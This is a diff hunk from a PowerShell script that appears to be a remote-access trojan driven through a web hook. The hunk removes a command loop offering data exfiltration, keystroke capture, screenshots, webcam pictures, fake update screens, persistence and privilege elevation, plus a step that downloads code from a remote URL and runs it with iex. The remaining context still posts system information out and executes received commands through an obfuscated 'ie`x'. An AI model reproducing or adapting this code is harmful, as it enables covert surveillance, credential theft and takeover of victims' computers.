@@ -516,58 +516,6 @@ while($true){
             Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
             break
         }
-        if ($response -match "options") {
-            $previouscmd = $response 
-            Options
-        }
-        if ($response -match "exfiltrate") {
-            $previouscmd = $response
-            Exfiltrate
-        }
-        if ($response -match "screenshot") {
-            $previouscmd = $response
-            ScreenShot
-        }
-        if ($response -match "keycapture") {
-            $previouscmd = $response
-            KeyCapture
-        }
-        if ($response -match "systeminfo") {
-            $previouscmd = $response
-            SystemInfo
-        }
-        if ($response -match "fakeupdate") {
-            $previouscmd = $response
-            FakeUpdate
-        }
-        if ($response -match "takepicture") {
-            $previouscmd = $response
-            TakePicture
-        }
-        if ($response -match "foldertree") {
-            $previouscmd = $response
-            FolderTree
-        }
-        if ($response -match "addpersistance") {
-            $previouscmd = $response
-            AddPersistance
-        }
-        if ($response -match "removepersistance") {
-            $previouscmd = $response
-            RemovePersistance
-        }
-        if ($response -match "customcommand") {
-            $previouscmd = $response
-            $customcommand = Invoke-RestMethod -Uri $CCurl | iex
-        }
-        if ($response -match "isadmmin") {
-            $previouscmd = $response
-            IsAdmin
-        }
-        if ($response -match "attemptelevate") {
-            $previouscmd = $response
-            AttemptElevate
-        }
         elseif (!($response -match "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
             if (($result.length -eq 0) -or ($result -contains "public_flags")){
